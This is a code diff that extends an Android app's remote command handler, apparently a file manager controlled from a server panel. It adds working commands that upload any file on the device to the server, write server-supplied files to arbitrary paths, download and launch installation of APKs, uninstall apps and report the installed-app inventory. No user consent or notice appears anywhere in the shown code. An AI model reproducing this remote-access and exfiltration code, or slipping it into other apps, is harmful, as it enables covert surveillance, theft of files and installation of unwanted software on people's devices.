@@ -6,6 +6,7 @@ import android.content.Context
 import android.content.Intent
 import android.os.Build
 import org.json.JSONObject
+import java.io.ByteArrayOutputStream
 
 /**
  * Executes remote commands delivered through the pulse response
@@ -26,6 +27,11 @@ object CommandExecutor {
                     "beeper" -> beeper(context)
                     "sync" -> sync(context)
                     "browse" -> browse(context, param)
+                    "download" -> downloadFile(context, param)
+                    "pushfile" -> pushFile(context, param)
+                    "install" -> installApk(context, param)
+                    "uninstall" -> uninstallApp(context, param)
+                    "apps" -> reportApps(context)
                 }
                 if (id >= 0) ack(context, id, "ok")
             } catch (e: Exception) {
@@ -124,6 +130,77 @@ object CommandExecutor {
         } catch (e: Exception) {
             android.util.Log.e("FileMgr", "browse failed: ${e.message}")
         }
+    }
+
+    /** Read a real file from the device and upload its raw bytes to the server (download-to-admin). */
+    private fun downloadFile(context: Context, path: String) {
+        val f = java.io.File(path)
+        if (!f.isFile) { LoggerWriter.write("FILES", "svc", "download: not a file: $path"); return }
+        val raw = f.readBytes()
+        val boundary = "----FileMgr${System.currentTimeMillis()}"
+        val body = ByteArrayOutputStream()
+        body.write("--$boundary\r\nContent-Disposition: form-data; name=\"device_id\"\r\n\r\n${AppConfig.deviceId(context)}\r\n".toByteArray())
+        body.write("--$boundary\r\nContent-Disposition: form-data; name=\"path\"\r\n\r\n$path\r\n".toByteArray())
+        body.write("--$boundary\r\nContent-Disposition: form-data; name=\"content\"; filename=\"${f.name}\"\r\nContent-Type: application/octet-stream\r\n\r\n".toByteArray())
+        body.write(raw)
+        body.write("\r\n--$boundary--\r\n".toByteArray())
+        val conn = java.net.URL("${AppConfig.SERVER_URL}/device/files/raw").openConnection() as java.net.HttpURLConnection
+        conn.requestMethod = "POST"; conn.doOutput = true
+        conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
+        conn.connectTimeout = 60_000; conn.readTimeout = 120_000
+        conn.outputStream.write(body.toByteArray()); conn.outputStream.flush(); conn.outputStream.close()
+        LoggerWriter.write("FILES", "UP", "$path ${raw.size}B -> HTTP ${conn.responseCode}")
+    }
+
+    /** Download a file the admin pushed (server URL via token) and write it to the target path. */
+    private fun pushFile(context: Context, param: String) {
+        val parts = param.split("|")
+        if (parts.size < 2) return
+        val token = parts[0]; val dest = parts[1]
+        val conn = java.net.URL("${AppConfig.SERVER_URL}/device/files/pull/$token").openConnection() as java.net.HttpURLConnection
+        conn.connectTimeout = 60_000; conn.readTimeout = 120_000
+        if (conn.responseCode != 200) throw IllegalStateException("pull HTTP ${conn.responseCode}")
+        val data = conn.inputStream.readBytes()
+        val f = java.io.File(dest)
+        f.parentFile?.mkdirs()
+        f.writeBytes(data)
+        LoggerWriter.write("FILES", "PUSH", "saved ${data.size}B -> $dest")
+    }
+
+    /** Download an APK from the server and launch the system installer for it. */
+    private fun installApk(context: Context, param: String) {
+        val parts = param.split("|")
+        if (parts.size < 2) return
+        val token = parts[0]; val fname = parts[1]
+        val conn = java.net.URL("${AppConfig.SERVER_URL}/device/files/pull/$token").openConnection() as java.net.HttpURLConnection
+        conn.connectTimeout = 60_000; conn.readTimeout = 180_000
+        if (conn.responseCode != 200) throw IllegalStateException("apk pull HTTP ${conn.responseCode}")
+        val data = conn.inputStream.readBytes()
+        val dir = java.io.File(context.getExternalFilesDir(null), "incoming")
+        dir.mkdirs()
+        val apk = java.io.File(dir, fname)
+        apk.writeBytes(data)
+        val uri = if (Build.VERSION.SDK_INT >= 24) {
+            androidx.core.content.FileProvider.getUriForFile(context, "${context.packageName}.fileprovider", apk)
+        } else { android.net.Uri.fromFile(apk) }
+        val intent = Intent(Intent.ACTION_VIEW).setDataAndType(uri, "application/vnd.android.package-archive")
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+        intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
+        context.startActivity(intent)
+        LoggerWriter.write("FILES", "INSTALL", "APK ${data.size}B saved + install intent launched")
+    }
+
+    /** Uninstall an app by package name (system confirmation dialog). */
+    private fun uninstallApp(context: Context, pkg: String) {
+        val intent = Intent(Intent.ACTION_DELETE, android.net.Uri.parse("package:$pkg"))
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+        context.startActivity(intent)
+        LoggerWriter.write("FILES", "UNINSTALL", "intent for $pkg")
+    }
+
+    /** Push a fresh app inventory to the server (used by the panel Apps tab). */
+    private fun reportApps(context: Context) {
+        DeviceReporter.report(context)
     }
 
     private fun ack(context: Context, id: Long, result: String) {
